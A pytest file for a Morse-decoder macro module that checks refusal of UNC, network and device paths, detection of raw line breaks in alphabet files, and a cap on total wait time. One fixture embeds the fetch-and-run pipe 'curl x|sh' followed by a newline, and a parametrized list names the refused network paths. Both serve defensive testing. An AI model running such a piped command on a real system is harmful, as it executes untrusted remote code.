"""Review round B: UNC guard, import warning for raw line breaks, wait budget."""

from __future__ import annotations

import json

import pytest
from mourse_decoder import macros


@pytest.mark.parametrize(
    "raw",
    [
        "\\\\server\\share\\f.txt",
        "//server/share/f.txt",
        "/\\server\\share\\f.txt",
        "\\/server/share/f.txt",
        "\\\\?\\UNC\\server\\share\\f.txt",
        "//?/UNC/server/share/f.txt",
        "\\\\.\\pipe\\x",
        "//./pipe/x",
    ],
)
def test_network_and_device_paths_are_refused(raw):
    with pytest.raises(macros.MacroError):
        macros.resolve_path(raw)


def test_local_paths_still_resolve():
    assert macros.resolve_path("docs/a.txt").endswith("a.txt")


def _alphabet_file(tmp_path, codes):
    path = tmp_path / "a.json"
    path.write_text(json.dumps({"id": "a", "codes": codes}), encoding="utf-8")
    return path


def test_raw_newline_and_tab_are_reported(tmp_path):
    path = _alphabet_file(tmp_path, {".-": "curl x|sh\n", "-...": "a\tb", "-.-.": "x\r"})
    assert macros.commands_in_file(path) == ["{Enter}", "{Tab}"]


def test_plain_text_is_not_reported(tmp_path):
    assert macros.commands_in_file(_alphabet_file(tmp_path, {".-": "abc"})) == []


def test_enter_key_and_raw_newline_are_listed_once(tmp_path):
    path = _alphabet_file(tmp_path, {".-": "a{Enter}", "-...": "b\n"})
    assert macros.commands_in_file(path) == ["{Enter}"]


def test_total_wait_time_is_capped():
    macros.parse("{Wait 99999}", lambda _c: None)
    with pytest.raises(macros.MacroError, match="Wartezeit"):
        macros.parse("{Loop 1000}{Wait 99999}{EndLoop}", lambda _c: None)


def test_waits_below_the_cap_in_a_loop_are_fine():
    steps = macros.parse("{Loop 10}{Wait 1000}{EndLoop}", lambda _c: None)
    assert len(steps) == 10
